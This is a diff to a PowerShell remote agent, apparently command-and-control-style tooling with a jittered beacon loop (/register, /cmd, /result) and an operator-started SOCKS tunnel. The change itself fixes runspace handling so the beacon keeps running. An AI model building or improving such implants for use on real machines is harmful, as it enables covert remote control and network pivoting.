@@ -613,6 +613,7 @@ function Sync-RmmSocksChannelFromServer {
         Stop-RmmSocksChannelWorker
     }
     Drain-RmmSocksHostLog
+    Restore-RmmHostRunspace
 }
 
 function Get-RmmSocksPollActive {
@@ -881,7 +882,8 @@ function Install-RmmSocksRunspaceHostLog {
 function New-RmmSocksRunspace {
     $fnNames = Get-RmmSocksWorkerFunctionNames
     $rs = [runspacefactory]::CreateRunspace()
-    $rs.ThreadOptions = 'ReuseThread'
+    # UseNewThread: ReuseThread can leave this runspace as the thread DefaultRunspace and break the host beacon loop.
+    $rs.ThreadOptions = 'UseNewThread'
     $rs.Open()
     $bootstrap = [PowerShell]::Create()
     $bootstrap.Runspace = $rs
@@ -990,6 +992,7 @@ Write-RmmSocksHostLine '[*] SOCKS channel worker stopped'
     $script:RmmSocksWorker.Async = $async
     Write-Host "[*] SOCKS channel started (operator ran socks; logs below)" -ForegroundColor Cyan
     Drain-RmmSocksHostLog
+    Restore-RmmHostRunspace
 }
 
 function Stop-RmmSocksChannelWorker {
@@ -1010,6 +1013,7 @@ function Stop-RmmSocksChannelWorker {
     $script:RmmSocksWorker.Async = $null
     Drain-RmmSocksHostLog
     Write-Host "[*] SOCKS channel stopped" -ForegroundColor Yellow
+    Restore-RmmHostRunspace
 }
 
 # 2>&1 on native exes turns stderr into ErrorRecord; Out-String then dumps script position noise.
@@ -1170,6 +1174,12 @@ function Get-RmmWebExceptionResponse {
     return $null
 }
 
+function Restore-RmmHostRunspace {
+    if ($null -ne $host.Runspace -and [runspace]::DefaultRunspace -ne $host.Runspace) {
+        [runspace]::DefaultRunspace = $host.Runspace
+    }
+}
+
 function Test-RmmSessionTerminated {
     param($ErrorRecord)
     try {
@@ -1265,6 +1275,7 @@ while (-not $registered) {
 # Main loop — beacon (/register, /cmd, /result); SOCKS channel starts when server socks_active is true
 while ($true) {
     try {
+        Restore-RmmHostRunspace
         $null = Get-JitteredSleep -baseSeconds $baseSleepSeconds -jitterPercent $jitterPercent
 
         $headers = Get-RmmRequestHeaders
@@ -1514,6 +1525,7 @@ while ($true) {
         Drain-RmmSocksHostLog
         
     } catch {
+        Restore-RmmHostRunspace
         if (Test-RmmSessionTerminated -ErrorRecord $_) {
             Write-Host "[*] Session killed on server (TERMINATED); exiting" -ForegroundColor Yellow
             exit 0
